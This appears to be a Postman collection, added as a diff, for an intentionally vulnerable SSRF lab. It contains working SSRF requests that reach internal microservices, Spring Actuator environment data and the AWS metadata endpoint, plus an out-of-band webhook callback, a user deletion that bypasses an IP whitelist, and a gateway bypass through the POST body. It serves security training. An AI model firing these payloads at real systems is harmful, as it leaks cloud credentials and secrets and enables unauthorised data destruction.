@@ -1,0 +1,387 @@
+{
+  "info": {
+    "name": "SSRF Vulnerable Lab - Complete Collection",
+    "description": "Complete API collection for testing SSRF vulnerabilities in microservices lab.\n\n⚠️ **WARNING:** This collection contains intentional security vulnerabilities for educational purposes only.\n\n## Quick Start\n1. Run 'Auth - Register' to create test account\n2. Run 'Auth - Login' to get JWT token (auto-saved)\n3. Test SSRF endpoints in 'SSRF Vulnerabilities' folder\n4. Use 'Exploitation Examples' for realistic attack scenarios",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+  },
+  "variable": [
+    {
+      "key": "BASE_URL",
+      "value": "https://quangtx.io.vn",
+      "type": "string"
+    },
+    {
+      "key": "LOCAL_URL",
+      "value": "http://localhost:8080",
+      "type": "string"
+    },
+    {
+      "key": "TOKEN",
+      "value": "",
+      "type": "string"
+    },
+    {
+      "key": "USERNAME",
+      "value": "pentester01",
+      "type": "string"
+    },
+    {
+      "key": "PASSWORD",
+      "value": "Test@123",
+      "type": "string"
+    }
+  ],
+  "item": [
+    {
+      "name": "1. Authentication",
+      "item": [
+        {
+          "name": "Auth - Register",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"username\": \"{{USERNAME}}\",\n  \"password\": \"{{PASSWORD}}\",\n  \"email\": \"test@example.com\"\n}"
+            },
+            "url": {
+              "raw": "{{BASE_URL}}/api/auth/register",
+              "host": ["{{BASE_URL}}"],
+              "path": ["api", "auth", "register"]
+            },
+            "description": "Register new user for testing"
+          }
+        },
+        {
+          "name": "Auth - Login",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "if (pm.response.code === 200) {",
+                  "    var jsonData = pm.response.json();",
+                  "    pm.collectionVariables.set('TOKEN', jsonData.token);",
+                  "    console.log('✅ Token saved:', jsonData.token);",
+                  "} else {",
+                  "    console.log('❌ Login failed');",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"username\": \"{{USERNAME}}\",\n  \"password\": \"{{PASSWORD}}\"\n}"
+            },
+            "url": {
+              "raw": "{{BASE_URL}}/api/auth/login",
+              "host": ["{{BASE_URL}}"],
+              "path": ["api", "auth", "login"]
+            },
+            "description": "Login and auto-save JWT token"
+          }
+        },
+        {
+          "name": "Auth - Get Current User",
+          "request": {
+            "method": "GET",
+            "header": [{"key": "Authorization", "value": "Bearer {{TOKEN}}"}],
+            "url": {
+              "raw": "{{BASE_URL}}/api/users/me",
+              "host": ["{{BASE_URL}}"],
+              "path": ["api", "users", "me"]
+            },
+            "description": "Verify token is valid"
+          }
+        }
+      ]
+    },
+    {
+      "name": "2. SSRF Vulnerabilities",
+      "item": [
+        {
+          "name": "SSRF - Price Check (GET Query)",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{BASE_URL}}/api/products/1/check_price?compare_url=https://example.com",
+              "host": ["{{BASE_URL}}"],
+              "path": ["api", "products", "1", "check_price"],
+              "query": [{"key": "compare_url", "value": "https://example.com"}]
+            },
+            "description": "🚨 SSRF via query parameter\n\nTry:\n- http://localhost:8081\n- http://user-service:8081/api/users\n- http://169.254.169.254/latest/meta-data/"
+          }
+        },
+        {
+          "name": "SSRF - Price Check (POST Body)",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"compare_url\": \"http://user-service:8081/api/users\"\n}"
+            },
+            "url": {
+              "raw": "{{BASE_URL}}/api/products/1/check_price",
+              "host": ["{{BASE_URL}}"],
+              "path": ["api", "products", "1", "check_price"]
+            },
+            "description": "🚨 SSRF via POST body - may bypass Gateway filter!"
+          }
+        },
+        {
+          "name": "SSRF - Fetch Review (GET)",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{BASE_URL}}/api/products/1/fetch_review?review_url=https://example.com",
+              "host": ["{{BASE_URL}}"],
+              "path": ["api", "products", "1", "fetch_review"],
+              "query": [{"key": "review_url", "value": "https://example.com"}]
+            },
+            "description": "🚨 SSRF - fetches full HTML content"
+          }
+        },
+        {
+          "name": "SSRF - Fetch Review (POST)",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"review_url\": \"http://product-service:8082/admin/\"\n}"
+            },
+            "url": {
+              "raw": "{{BASE_URL}}/api/products/1/fetch_review",
+              "host": ["{{BASE_URL}}"],
+              "path": ["api", "products", "1", "fetch_review"]
+            }
+          }
+        },
+        {
+          "name": "SSRF - Social Share (POST SSRF)",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"share_api_url\": \"https://webhook.site/your-unique-id\"\n}"
+            },
+            "url": {
+              "raw": "{{BASE_URL}}/api/products/1/share",
+              "host": ["{{BASE_URL}}"],
+              "path": ["api", "products", "1", "share"]
+            },
+            "description": "🚨 SSRF with POST request - server POSTs product data to your URL"
+          }
+        },
+        {
+          "name": "SSRF - Avatar Validate (Auth Required)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {"key": "Authorization", "value": "Bearer {{TOKEN}}"},
+              {"key": "Content-Type", "value": "application/json"}
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"url\": \"http://user-service:8081/actuator/env\"\n}"
+            },
+            "url": {
+              "raw": "{{BASE_URL}}/api/users/me/avatar/validate",
+              "host": ["{{BASE_URL}}"],
+              "path": ["api", "users", "me", "avatar", "validate"]
+            },
+            "description": "🚨 Authenticated SSRF - requires JWT token"
+          }
+        },
+        {
+          "name": "SSRF - Avatar Validate (GET)",
+          "request": {
+            "method": "GET",
+            "header": [{"key": "Authorization", "value": "Bearer {{TOKEN}}"}],
+            "url": {
+              "raw": "{{BASE_URL}}/api/users/me/avatar/validate?url=http://localhost:8081",
+              "host": ["{{BASE_URL}}"],
+              "path": ["api", "users", "me", "avatar", "validate"],
+              "query": [{"key": "url", "value": "http://localhost:8081"}]
+            }
+          }
+        }
+      ]
+    },
+    {
+      "name": "3. Exploitation Examples",
+      "item": [
+        {
+          "name": "Exploit - Scan Internal Services",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{BASE_URL}}/api/products/1/check_price?compare_url=http://user-service:8081/api/users",
+              "host": ["{{BASE_URL}}"],
+              "path": ["api", "products", "1", "check_price"],
+              "query": [{"key": "compare_url", "value": "http://user-service:8081/api/users"}]
+            },
+            "description": "Scan internal user-service to enumerate users"
+          }
+        },
+        {
+          "name": "Exploit - Access Actuator Endpoints",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"compare_url\": \"http://user-service:8081/actuator/env\"\n}"
+            },
+            "url": {
+              "raw": "{{BASE_URL}}/api/products/1/check_price",
+              "host": ["{{BASE_URL}}"],
+              "path": ["api", "products", "1", "check_price"]
+            },
+            "description": "Access Spring Boot Actuator to leak environment variables"
+          }
+        },
+        {
+          "name": "Exploit - Metadata Endpoint (AWS)",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"review_url\": \"http://169.254.169.254/latest/meta-data/\"\n}"
+            },
+            "url": {
+              "raw": "{{BASE_URL}}/api/products/1/fetch_review",
+              "host": ["{{BASE_URL}}"],
+              "path": ["api", "products", "1", "fetch_review"]
+            },
+            "description": "Try to access cloud metadata endpoint"
+          }
+        },
+        {
+          "name": "Exploit - Out-of-Band (Webhook.site)",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"share_api_url\": \"https://webhook.site/#!/your-unique-id\"\n}"
+            },
+            "url": {
+              "raw": "{{BASE_URL}}/api/products/1/share",
+              "host": ["{{BASE_URL}}"],
+              "path": ["api", "products", "1", "share"]
+            },
+            "description": "Confirm SSRF with out-of-band request.\n\n1. Go to webhook.site\n2. Copy your unique URL\n3. Replace 'your-unique-id'\n4. Run request\n5. Check webhook.site for incoming request from server"
+          }
+        },
+        {
+          "name": "Exploit - Privilege Escalation (Delete User)",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{BASE_URL}}/api/products/1/check_price?compare_url=http://user-service:8081/api/users/delete/1",
+              "host": ["{{BASE_URL}}"],
+              "path": ["api", "products", "1", "check_price"],
+              "query": [{"key": "compare_url", "value": "http://user-service:8081/api/users/delete/1"}]
+            },
+            "description": "Bypass IP whitelist by SSRF from internal service.\n\nDirect access: 403 (external IP blocked)\nSSRF access: 200 (internal IP allowed)"
+          }
+        }
+      ]
+    },
+    {
+      "name": "4. API Gateway Tests",
+      "item": [
+        {
+          "name": "Gateway - Health Check",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{BASE_URL}}/actuator/health",
+              "host": ["{{BASE_URL}}"],
+              "path": ["actuator", "health"]
+            },
+            "description": "Check if API Gateway is running"
+          }
+        },
+        {
+          "name": "Gateway - Test SSRF Block (localhost)",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{BASE_URL}}/api/products/1/check_price?compare_url=http://localhost:8081",
+              "host": ["{{BASE_URL}}"],
+              "path": ["api", "products", "1", "check_price"],
+              "query": [{"key": "compare_url", "value": "http://localhost:8081"}]
+            },
+            "description": "Should return 403 if Gateway is working"
+          }
+        },
+        {
+          "name": "Gateway - Test SSRF Block (private IP)",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{BASE_URL}}/api/products/1/check_price?compare_url=http://192.168.1.1",
+              "host": ["{{BASE_URL}}"],
+              "path": ["api", "products", "1", "check_price"],
+              "query": [{"key": "compare_url", "value": "http://192.168.1.1"}]
+            },
+            "description": "Should return 403 - Gateway blocks private IPs"
+          }
+        },
+        {
+          "name": "Gateway - Bypass with POST Body",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"compare_url\": \"http://localhost:8081\"\n}"
+            },
+            "url": {
+              "raw": "{{BASE_URL}}/api/products/1/check_price",
+              "host": ["{{BASE_URL}}"],
+              "path": ["api", "products", "1", "check_price"]
+            },
+            "description": "Gateway only checks query params - POST body may bypass!"
+          }
+        }
+      ]
+    },
+    {
+      "name": "5. Normal API Endpoints",
+      "item": [
+        {
+          "name": "Products - List All",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{BASE_URL}}/api/products/",
+              "host": ["{{BASE_URL}}"],
+              "path": ["api", "products", ""]
+            }
+          }
+        },
+        {
+          "name": "Products - Get Details",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{BASE_URL}}/api/products/1/",
+              "host": ["{{BASE_URL}}"],
+              "path": ["api", "products", "1", ""]
+            }
+          }
+        }
+      ]
+    }
+  ]
+}
